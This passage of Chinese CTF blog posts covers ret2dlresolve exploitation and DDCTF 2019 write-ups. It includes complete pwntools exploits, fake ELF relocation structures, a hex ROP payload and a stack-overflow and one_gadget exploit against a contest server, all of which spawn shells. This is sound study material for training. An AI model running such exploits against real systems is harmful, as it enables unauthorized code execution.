<li>根据找到的字符串在 libc 中搜索对应的函数地址，并回填到 Elf32_Rel 的 r_offset 成员中。</li>
<li>将控制权交给解析出来的函数。</li>
</ol>
<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>如果程序没有开启 RELRO 保护，即 checksec 显示 No RELRO 的时候，我们可以通过修改 .dynamic 节的 .dynstr 指针，将它指向一块可控内存，然后在对应的位置上面伪造好想要解析出来的函数名，例如 “system”。</p>
<p>上面的方法是最简单的，但是很多情况下题目都会开启部分 RELRO 保护，不能修改 .dynamic 的 .dynstr 指针(没有写权限)，此时要用到另一种方法，那就是控制 _dl_runtime_resolve 的第二个参数。</p>
<p>通过上面介绍的函数流程，可以发现函数的解析链如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_dl_runtime_resolve(linkmap, offset) -&gt; Elf32_Rel -&gt; r_info -&gt; Elf32_Sym -&gt; st_name -&gt; string -&gt; r_offset</span><br></pre></td></tr></table></figure></div>

<p>当进行 ROP 等操作的时候，构造一个很大的 offset，并且在可控的内存空间伪造一个 Elf32_Rel 结构体，由于 libc 源代码中没有检查 offset 是否合法(取得这个结构体的算法是 .rel_plt + offset)，当根据我们伪造的 offset 获取 Elf32_Rel 的时候就会落在伪造的结构体内部。</p>
<p>紧接着在伪造的结构体中构造好 r_info 偏移量，同样的，这个偏移量也可以伪造一个较大的值，使得 Elf32_Sym 结构体也落在可控内存区域。</p>
<p>在伪造的 Elf32_Sym 结构体中伪造 st_name，并在目标地址写入想要解析的函数名。</p>
<p>将上面三步操作用图片表示</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/ret2dlresolve4.png"
                     
                ><br>这一攻击流程的核心点在于控制好各个位置的偏移量，可能需要多次调试才能确定精确的偏移。</p>
<h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>ISCC 2019 的 PWN01，这道题没有给输出函数，只有一个栈溢出漏洞，并且将数据填写到了 bss 段。</p>
<p>主要代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest; <span class="comment">// [esp+0h] [ebp-16h]</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [esp+Ah] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v6; <span class="comment">// [esp+Eh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = &amp;argc;</span><br><span class="line">  n = read(<span class="number">0</span>, &amp;buf, <span class="number">0xF4240</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, &amp;buf, n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>现将数据读入 bss 段，然后拷贝到栈上，导致栈溢出。</p>
<p>按照攻击思路，我们只需要构造好 ROP 链以及三个 fake 结构体即可完成利用。</p>
<p>构造 ROP 利用链，将返回地址劫持到 plt[0] 即 push linkmap 的位置，同时伪造好三个结构：Elf32_Rel、Elf32_Sym 和有效的字符串 “system”，当执行完 _dl_runtime_resolve 之后，就会将 system 的地址填充到 read 的 got 表中。</p>
<p>完整 EXP 如下</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./pwn01&quot;</span></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port =  <span class="number">10000</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">libc_ver = <span class="string">&quot;2.23&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> libc_ver == <span class="string">&quot;2.23&quot;</span>:</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> libc_ver == <span class="string">&quot;2.27&quot;</span>:</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    log.warning(<span class="string">&quot;Unknown libc ver!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span></span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">buf_addr = <span class="number">0x0804A040</span></span><br><span class="line">padding = <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">6</span>    <span class="comment"># padding until pop ecx</span></span><br><span class="line">fake_ecx = p32(buf_addr + <span class="number">0x300</span>)</span><br><span class="line">padding2 = <span class="string">&quot;\x00&quot;</span> * (<span class="number">0x300</span> - <span class="number">22</span>)</span><br><span class="line">ret_to_dlresolve = p32(<span class="number">0x80482f0</span>)</span><br><span class="line">fake_offset = p32(buf_addr - <span class="number">0x080482B4</span> + <span class="built_in">len</span>(padding) + <span class="built_in">len</span>(fake_ecx) + <span class="built_in">len</span>(padding2) + <span class="built_in">len</span>(ret_to_dlresolve) + <span class="number">20</span>)</span><br><span class="line">padding3 = p32(buf_addr) + p32(buf_addr) * <span class="number">3</span></span><br><span class="line">fake_r_offset = p32(<span class="number">0x804A00C</span>)</span><br><span class="line">fake_r_info = p32(<span class="number">0x21907</span>)</span><br><span class="line">fake_st_name = p32(<span class="number">0x2140</span>)</span><br><span class="line">fake_Elf32_Sym = p32(<span class="number">0</span>) * <span class="number">2</span> + p32(<span class="number">0x12</span>) + <span class="string">&quot;system\x00&quot;</span></span><br><span class="line">bin_sh = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload = padding + fake_ecx + padding2 + ret_to_dlresolve + fake_offset + padding3 + fake_r_offset + fake_r_info + \</span><br><span class="line">          fake_st_name + fake_Elf32_Sym + bin_sh</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>注意，虽然说 padding 填充什么都可以，但是当程序执行 system 函数中的 execve 时，需要满足一些必要的条件，由于我们已经将栈帧迁移到了 bss 段，所以 padding 最好填充为 ‘\x00’，否则在执行 execve 的时候会由于环境不正常导致syscall 执行失败。</p>
<h2 id="再举个栗子"><a href="#再举个栗子" class="headerlink" title="再举个栗子"></a>再举个栗子</h2><p>这是 2020 年铁三线上赛的一道 pwn 题，利用思路也是 ret2dlresolve，我们可以选择更简单的方式去利用，pwntools 内部集成了 Ret2dlresolvePayload 工具，可以 “一键” 实现攻击。</p>
<p>题目下载地址：链接：<a class="link"   href="https://pan.baidu.com/s/1hkzR87BY8wqDAm_3Z8KSYw" >https://pan.baidu.com/s/1hkzR87BY8wqDAm_3Z8KSYw<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>    提取码：5cac </p>
<p>官方例子</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get(&#x27;i386&#x27;))</span><br><span class="line">&gt;&gt;&gt; rop = ROP(context.binary)</span><br><span class="line">&gt;&gt;&gt; dlresolve = Ret2dlresolvePayload(elf, symbol=&quot;system&quot;, args=[&quot;echo pwned&quot;])</span><br><span class="line">&gt;&gt;&gt; rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like</span><br><span class="line">&gt;&gt;&gt; rop.ret2dlresolve(dlresolve)</span><br><span class="line">&gt;&gt;&gt; raw_rop = rop.chain()</span><br><span class="line">&gt;&gt;&gt; print(rop.dump())</span><br><span class="line">0x0000:        0x80482e0 read(0, 0x804ae00)</span><br><span class="line">0x0004:        0x80484ea &lt;adjust @0x10&gt; pop edi; pop ebp; ret</span><br><span class="line">0x0008:              0x0 arg0</span><br><span class="line">0x000c:        0x804ae00 arg1</span><br><span class="line">0x0010:        0x80482d0 [plt_init] system(0x804ae24)</span><br><span class="line">0x0014:           0x2b84 [dlresolve index]</span><br><span class="line">0x0018:          b&#x27;gaaa&#x27; &lt;return address&gt;</span><br><span class="line">0x001c:        0x804ae24 arg0</span><br><span class="line">&gt;&gt;&gt; p = elf.process()</span><br><span class="line">&gt;&gt;&gt; p.sendline(fit(&#123;64+context.bytes*3: raw_rop, 200: dlresolve.payload&#125;))</span><br><span class="line">&gt;&gt;&gt; p.recvline()</span><br><span class="line">b&#x27;pwned\n&#x27;</span><br></pre></td></tr></table></figure></div>

<p>比较重要的是 Ret2dlresolvePayload，第一个参数是目标文件的 ELF 对象，第二个是想要解析的函数名，第三个是函数参数。</p>
<p>针对这道题，先依照官方的例子得到 payload，但是在执行 system 函数的时候发现由于 env 参数不为 0，会导致执行失败，所以将输出的 payload 中占位的字节改成 \x00 即可。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./readme2&quot;</span>)</span><br><span class="line">p = elf.process()</span><br><span class="line">payload = <span class="string">&quot;6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d616161608304085a8504080000000000ae040840830408182b00006761616120ae0408000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000073797374656d0061a82b000000000000000000000000000000ae040807c302002f62696e2f736800&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload.encode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>DDCTF 2019</title>
    <url>/2019/04/18/DDCTF2019/</url>
    <content><![CDATA[<p>最近打了 DDCTF。</p>
<h2 id="真-签到题"><a href="#真-签到题" class="headerlink" title="真-签到题"></a>真-签到题</h2><p>在公告里面找到 flag</p>
<span id="more"></span>

<h2 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows Reverse1"></a>Windows Reverse1</h2><p>加了 UPX 的壳，在 linux 下用 upx -d 脱掉，然后分析代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+4h] [ebp-804h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+5h] [ebp-803h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+404h] [ebp-404h]</span></span><br><span class="line">  <span class="type">char</span> Dst; <span class="comment">// [esp+405h] [ebp-403h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v5, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input code:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v6);</span><br><span class="line">  check(&amp;v6);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v4, <span class="string">&quot;DDCTF&#123;reverseME&#125;&quot;</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;ve got it!!%s\n&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try again later.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>获取用户输入之后就进入 check 函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">check</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (a1 - v1);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v1 = byte_402FF8[v1[v4]];</span><br><span class="line">      ++v2;</span><br><span class="line">      ++v1;</span><br><span class="line">      result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 &lt; result );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>静态来看似乎是以输入为索引，在一个表中查找相应的字符出来，后续用 OD 调试也印证了这一猜测。</p>
<p>随后将取出的字符和 “DDCTF{reverseME}” 去比较，如果相等说明输入是正确的，那么编写脚本找出这些 index 即可。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">125</span>, <span class="number">124</span>, <span class="number">123</span>, <span class="number">122</span>, <span class="number">121</span>, <span class="number">120</span>, <span class="number">119</span>, <span class="number">118</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">113</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">107</span>, <span class="number">106</span>, <span class="number">105</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">99</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">96</span>, <span class="number">95</span>, <span class="number">94</span>, <span class="number">93</span>, <span class="number">92</span>, <span class="number">91</span>, <span class="number">90</span>, <span class="number">89</span>, <span class="number">88</span>, <span class="number">87</span>, <span class="number">86</span>, <span class="number">85</span>, <span class="number">84</span>, <span class="number">83</span>, <span class="number">82</span>, <span class="number">81</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">78</span>, <span class="number">77</span>, <span class="number">76</span>, <span class="number">75</span>, <span class="number">74</span>, <span class="number">73</span>, <span class="number">72</span>, <span class="number">71</span>, <span class="number">70</span>, <span class="number">69</span>, <span class="number">68</span>, <span class="number">67</span>, <span class="number">66</span>, <span class="number">65</span>, <span class="number">64</span>, <span class="number">63</span>, <span class="number">62</span>, <span class="number">61</span>, <span class="number">60</span>, <span class="number">59</span>, <span class="number">58</span>, <span class="number">57</span>, <span class="number">56</span>, <span class="number">55</span>, <span class="number">54</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">47</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">44</span>, <span class="number">43</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">40</span>, <span class="number">39</span>, <span class="number">38</span>, <span class="number">37</span>, <span class="number">36</span>, <span class="number">35</span>, <span class="number">34</span>, <span class="number">33</span>, <span class="number">32</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;D&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of D is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of C is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;T&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of T is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;F&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of F is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of &#123; is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of &#125; is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;r&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of r is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of e is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;v&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of v is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of s is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of M is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;E&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;index of E is &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ZZ[JX#,9(9,+9QY!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>重新排列字符即可得到 flag (当然也可以通过调试直接拿 flag)。</p>
<p>flag: ZZ[JX#,9(9,+9QY!</p>
<h2 id="Windows-Reverse2"><a href="#Windows-Reverse2" class="headerlink" title="Windows Reverse2"></a>Windows Reverse2</h2><p>加了 ASP 的壳，我试了几个脱壳工具都不能正常脱壳，索性带着壳直接调试，利用 ESP 定律 + 字符串搜索定位到主函数，简单看了一下，第一个关键函数在 0x11611f0(这个地址可能不一样，但是就在 scanf 函数下方)，它用来验证输入是否由 16 进制字符串构成，即我们的输入只能由 0<del>9 + A</del>F 组成，随后还会将输入两两一组转换成真正的十六进制。</p>
<p>另外一个函数动态分析看到解密了字符串，’ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;‘，很明显是 BASE64 算法的表盘，猜测这个函数实现了 BASE64 编码或者解码，最终将结果和 reverse+ 进行比较。编写脚本对 reverse+ 字符串进行 base64 解码得到正确的 flag。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = [<span class="number">55</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">62</span>, <span class="number">63</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">44</span>, <span class="number">23</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">64</span>, <span class="number">65</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">93</span>, <span class="number">89</span>]</span><br><span class="line">t = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    t += <span class="built_in">chr</span>(i ^ <span class="number">0x76</span>)</span><br><span class="line"><span class="built_in">print</span> t</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(<span class="string">&quot;reverse+&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># \xad\xeb\xde\xae\xc7\xbe</span></span><br><span class="line"><span class="comment"># ADEBDEAEC7BE</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>flag:  ADEBDEAEC7BE</p>
<h2 id="PWN-strike"><a href="#PWN-strike" class="headerlink" title="[PWN] strike"></a>[PWN] strike</h2><p>漏洞在于输入长度的时候没有考虑为负数的情况，当输入一个负数的时候发生整数溢出回绕到一个非常大的正数，导致栈溢出。</p>
<p>另外在读取 username 的时候没有补零，导致信息泄露。</p>
<p>思路是通过信息泄露找到 libc 的地址和 ebp 的地址(栈的地址)，然后通过栈溢出返回到 onegadget  getshell。</p>
<p>注意到发生栈溢出的函数结尾有以下汇编代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea     esp, [ebp-8]</span><br><span class="line">pop     ecx</span><br><span class="line">pop     ebx</span><br><span class="line">pop     ebp</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure></div>

<p>并不是常规的 leave ret 结构，所以构造利用链就稍稍复杂一些，另外服务器上面的 libc 和本地的 libc 好像稍有不同。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./xpwn&quot;</span></span><br><span class="line">ip = <span class="string">&quot;116.85.48.105&quot;</span></span><br><span class="line">port =  <span class="number">5005</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Enter username: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span> * <span class="number">60</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello &quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">60</span> + <span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line">libc_addr = u32(<span class="string">&#x27;\x50&#x27;</span> + p.recv(<span class="number">3</span>)) - libc.symbols[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_addr: %x&quot;</span> % libc_addr)</span><br><span class="line">one_gadget = libc_addr + <span class="number">0x3a819</span></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;ebp_addr : 0x%x&quot;</span> % ebp_addr)</span><br><span class="line">log.info(<span class="string">&quot;one_gadget: %x&quot;</span> % one_gadget)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please set the length of password: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">68</span> + p32(ebp_addr + <span class="number">4</span>) + <span class="string">&quot;bbbb&quot;</span> + p32(one_gadget) + p32(ebp_addr + <span class="number">8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># DDCTF&#123;s0_3asy_St4ck0verfl0w_r1ght?&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>flag: DDCTF{s0_3asy_St4ck0verfl0w_r1ght?}</p>
<h2 id="Confused"><a href="#Confused" class="headerlink" title="Confused"></a>Confused</h2><p>用 objective-C 编写的程序， IDA 打开程序发现反编译的效果相当不错，并且没有去除符号信息。</p>
<p>不能执行程序就只能静态分析，在 checkcode 函数中找到了具体的验证算法，简单分析一下，程序实现了一个虚拟机，从代码段取出 opcode，然后利用 loader 函数执行。</p>
